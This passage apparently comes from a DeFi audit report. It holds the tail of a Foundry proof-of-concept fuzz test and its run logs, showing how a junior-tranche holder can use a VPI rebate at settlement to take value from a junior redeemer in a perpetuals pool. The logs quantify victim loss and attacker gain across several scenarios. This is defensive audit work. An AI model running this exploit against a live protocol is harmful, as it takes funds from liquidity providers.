        c.honestTrader = honest;
        uint256 depth = c.senior + c.vicJr + c.attJr + c.honJr + 2000e6;
        uint256 sz = (depth * bound(skewBps, 1000, 3900) / 10_000) / 1e6 / 100 * 100 * 1e18;
        c.bgSize = sz;
        c.rebSize = sz;
        (Res memory b, Res memory a) = _run(c);
        if (a.vicClaimableAtSettle != a.vicShares || b.vicClaimableAtSettle != b.vicShares) return; // cap-bound: skip
        uint256 jrSupplyAssets = c.vicJr + c.attJr + c.honJr + 1000e6;
        uint256 qr = a.rebate * c.vicJr / jrSupplyAssets;
        int256 loss = _d(b.vicAssets, a.vicAssets);
        assertGt(loss, 0, "victim loss");
        assertApproxEqRel(uint256(loss), qr, 0.01e18, "loss == q*r");
        assertEq(a.reserveAtSettle, a.rebate, "rebate outstanding at settle");
        assertEq(a.reserveAfterClose, 0, "clawed back after");
        assertEq(a.senValue, b.senValue, "senior stayer unaffected");
    }

}
```

### Result

```
Ran 5 tests for test/perps/audit/VpiRebateRedeemSideNav.t.sol:VpiRebateRedeemSideNavPoC
[PASS] testFuzz_redeemSide_lossEqualsQr(uint256,uint256,uint256,uint256,bool) (runs: 256, μ: 16637809, ~: 16648270)
[PASS] test_redeemSide_attackerStayer_poc() (gas: 15968483)
Logs:
  ===== attacker-stayer
  senior/seniorVic/vicJr/attJr/honJr (USDG) 4000000 0
      2000000 1500000 0
  bgSize/rebSize (USD notional) 2990000 2990000
  pool depth at SHORT open 7507958
  rebate r (USDG)  5953 74
  reserve at settle (atk twin)  5953 74
  reserve after close (atk twin)  0 0
  junior NAV before settle  base  3506884 72
  junior NAV before settle  atk   3500930 97
  juniorPrincipal after settle base  1503522 60
  juniorPrincipal after settle atk   1500970 2
  junior NAV after close base  1503522 28
  junior NAV after close atk   1509094 22
  VIC shares / funded-at-settle base / atk 2001334221478761 2001334221478761 2001334221478761
  VIC redeem assets base  2003362 12
  VIC redeem assets atk   1999960 94
  SVIC senior redeem assets base  0 0
  SVIC senior redeem assets atk   0 0
  treasury exec fees (atk twin)  2392 0
  SHORT trader net (atk twin) - 4562 76
  VICTIM LOSS (junior redeemer)  3401 17
  ATT junior stake gain  5568 22
  ATT NET (stake gain + trader net)  1005 46
  HON junior stayer gain  0 0
  SEN senior stayer gain  0 0
  SVIC senior redeemer diff  0 0

[PASS] test_redeemSide_honestRebate_noAttacker() (gas: 16691080)
Logs:
  ===== honest-no-attacker
  senior/seniorVic/vicJr/attJr/honJr (USDG) 4000000 0
      1000000 1000000 1000000
  bgSize/rebSize (USD notional) 2790000 2790000
  pool depth at SHORT open 7007558
  rebate r (USDG)  5554 7
  reserve at settle (atk twin)  5554 7
  reserve after close (atk twin)  0 0
  junior NAV before settle  base  3000926 24
  junior NAV before settle  atk   3000926 24
  juniorPrincipal after settle base  2004656 87
  juniorPrincipal after settle atk   2000953 54
  junior NAV after close base  2004656 55
  junior NAV after close atk   2007443 56
  VIC shares / funded-at-settle base / atk 1000667110739381 1000667110739381 1000667110739381
  VIC redeem assets base  1001827 85
  VIC redeem assets atk   999977 11
  SVIC senior redeem assets base  0 0
  SVIC senior redeem assets atk   0 0
  treasury exec fees (atk twin)  2232 0
  SHORT trader net (atk twin) - 3168 26
  VICTIM LOSS (junior redeemer)  1850 74
  ATT junior stake gain  1392 80
  ATT NET (stake gain + trader net)  1392 80
  HON junior stayer gain  1392 80
  SEN senior stayer gain  0 0
  SVIC senior redeemer diff  0 0

[PASS] test_redeemSide_seniorRedeemer() (gas: 17828790)
Logs:
  ===== senior-redeemer
  senior/seniorVic/vicJr/attJr/honJr (USDG) 4000000 500000
      2000000 1500000 0
  bgSize/rebSize (USD notional) 3190000 3190000
  pool depth at SHORT open 8008358
  rebate r (USDG)  6353 42
  reserve at settle (atk twin)  6353 42
  reserve after close (atk twin)  0 0
  junior NAV before settle  base  3507275 58
  junior NAV before settle  atk   3500922 16
  juniorPrincipal after settle base  1503690 18
  juniorPrincipal after settle atk   1500966 24
  junior NAV after close base  1503689 86
  junior NAV after close atk   1510213 69
  VIC shares / funded-at-settle base / atk 2001334221478761 2001334221478761 2001334221478761
  VIC redeem assets base  2003585 40
  VIC redeem assets atk   1999955 91
  SVIC senior redeem assets base  500009 13
  SVIC senior redeem assets atk   500009 13
  treasury exec fees (atk twin)  2552 0
  SHORT trader net (atk twin) - 5446 33
  VICTIM LOSS (junior redeemer)  3629 49
  ATT junior stake gain  6519 48
  ATT NET (stake gain + trader net)  1073 14
  HON junior stayer gain  0 0
  SEN senior stayer gain  0 0
  SVIC senior redeemer diff  0 0

[PASS] test_redeemSide_sweep() (gas: 79847684)
Logs:
  ===== sweep-0
  senior/seniorVic/vicJr/attJr/honJr (USDG) 4000000 0
      1000000 2000000 0
  bgSize/rebSize (USD notional) 2730000 2730000
  pool depth at SHORT open 7007321
  rebate r (USDG)  5317 93
  reserve at settle (atk twin)  5317 93
  reserve after close (atk twin)  0 0
  junior NAV before settle  base  3006248 22
  junior NAV before settle  atk   3000930 28
  juniorPrincipal after settle base  2004499 17
  juniorPrincipal after settle atk   2000953 29
  junior NAV after close base  2004498 86
  junior NAV after close atk   2007161 77
  VIC shares / funded-at-settle base / atk 1000667110739381 1000667110739381 1000667110739381
  VIC redeem assets base  1001749 4
  VIC redeem assets atk   999976 99
  SVIC senior redeem assets base  0 0
  SVIC senior redeem assets atk   0 0
  treasury exec fees (atk twin)  2184 0
  SHORT trader net (atk twin) - 3074 86
  VICTIM LOSS (junior redeemer)  1772 5
  ATT junior stake gain  2661 58
  ATT NET (stake gain + trader net) - 413 27
  HON junior stayer gain  0 0
  SEN senior stayer gain  0 0
  SVIC senior redeemer diff  0 0
  ===== sweep-1
  senior/seniorVic/vicJr/attJr/honJr (USDG) 4000000 0
      2000000 1500000 0
  bgSize/rebSize (USD notional) 2920000 2920000
  pool depth at SHORT open 7507682
  rebate r (USDG)  5678 44
  reserve at settle (atk twin)  5678 44
  reserve after close (atk twin)  0 0
  junior NAV before settle  base  3506608 99
  junior NAV before settle  atk   3500930 54
  juniorPrincipal after settle base  1503404 39
  juniorPrincipal after settle atk   1500969 84
  junior NAV after close base  1503404 7
  junior NAV after close atk   1508718 8
  VIC shares / funded-at-settle base / atk 2001334221478761 2001334221478761 2001334221478761
  VIC redeem assets base  2003204 60
  VIC redeem assets atk   1999960 70
  SVIC senior redeem assets base  0 0
  SVIC senior redeem assets atk   0 0
  treasury exec fees (atk twin)  2336 0
  SHORT trader net (atk twin) - 4406 10
  VICTIM LOSS (junior redeemer)  3243 90
  ATT junior stake gain  5310 47
  ATT NET (stake gain + trader net)  904 36
  HON junior stayer gain  0 0
  SEN senior stayer gain  0 0
  SVIC senior redeemer diff  0 0
  ===== sweep-2
  senior/seniorVic/vicJr/attJr/honJr (USDG) 4000000 0
      3000000 1200000 0
  bgSize/rebSize (USD notional) 3190000 3190000
  pool depth at SHORT open 8208203
  rebate r (USDG)  6198 73
  reserve at settle (atk twin)  6198 73
  reserve after close (atk twin)  0 0
  junior NAV before settle  base  4207129 67
  junior NAV before settle  atk   4200930 93
  juniorPrincipal after settle base  1202751 90
  juniorPrincipal after settle atk   1200979 77
  junior NAV after close base  1202751 58
  junior NAV after close atk   1210760 50
  VIC shares / funded-at-settle base / atk 3002001332218142 3002001332218142 3002001332218142
  VIC redeem assets base  3004377 77
  VIC redeem assets atk   2999951 15
  SVIC senior redeem assets base  0 0
  SVIC senior redeem assets atk   0 0
  treasury exec fees (atk twin)  2552 0
  SHORT trader net (atk twin) - 6134 30
  VICTIM LOSS (junior redeemer)  4426 61
  ATT junior stake gain  8002 25
  ATT NET (stake gain + trader net)  1867 95
  HON junior stayer gain  0 0
  SEN senior stayer gain  0 0
  SVIC senior redeemer diff  0 0
  ===== sweep-3
  senior/seniorVic/vicJr/attJr/honJr (USDG) 4000000 0
      5000000 1200000 0
  bgSize/rebSize (USD notional) 3970000 3970000
  pool depth at SHORT open 10209724
  rebate r (USDG)  7718 57
  reserve at settle (atk twin)  7718 57
  reserve after close (atk twin)  0 0
  junior NAV before settle  base  6208650 66
  junior NAV before settle  atk   6200932 9
  juniorPrincipal after settle base  1202481 23
  juniorPrincipal after settle atk   1200986 30
  junior NAV after close base  1202480 91
  junior NAV after close atk   1216134 96
  VIC shares / funded-at-settle base / atk 5003335553696904 5003335553696904 5003335553696904
  VIC redeem assets base  5006169 43
  VIC redeem assets atk   4999945 78
  SVIC senior redeem assets base  0 0
  SVIC senior redeem assets atk   0 0
  treasury exec fees (atk twin)  3176 0
  SHORT trader net (atk twin) - 10606 40
  VICTIM LOSS (junior redeemer)  6223 65
  ATT junior stake gain  13642 69
  ATT NET (stake gain + trader net)  3036 29
  HON junior stayer gain  0 0
  SEN senior stayer gain  0 0
  SVIC senior redeemer diff  0 0
  ===== sweep-4
  senior/seniorVic/vicJr/attJr/honJr (USDG) 4000000 0
      9000000 1200000 0
  bgSize/rebSize (USD notional) 5530000 5530000
  pool depth at SHORT open 14212766
  rebate r (USDG)  10758 25
  reserve at settle (atk twin)  10758 25
  reserve after close (atk twin)  0 0
  junior NAV before settle  base  10211692 65
  junior NAV before settle  atk   10200934 40
  juniorPrincipal after settle base  1542751 24
  juniorPrincipal after settle atk   1542751 24
  junior NAV after close base  1542750 93
  junior NAV after close atk   1570332 40
  VIC shares / funded-at-settle base / atk 9006003996654428 8665640688720440 8664014270579176
  VIC redeem assets base  8668941 40
  VIC redeem assets atk   8658183 15
  SVIC senior redeem assets base  0 0
  SVIC senior redeem assets atk   0 0
  treasury exec fees (atk twin)  4424 0
  SHORT trader net (atk twin) - 21247 22
  VICTIM LOSS (junior redeemer)  10758 25
  ATT junior stake gain  20188 4
  ATT NET (stake gain + trader net) - 1059 18
  HON junior stayer gain  0 0
  SEN senior stayer gain  0 0
  SVIC senior redeemer diff  0 0

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 5.98s (5.97s CPU time)

Ran 1 test suite in 5.99s (5.98s CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
```

(USDG values are printed as `<USDG> <cents>`.)

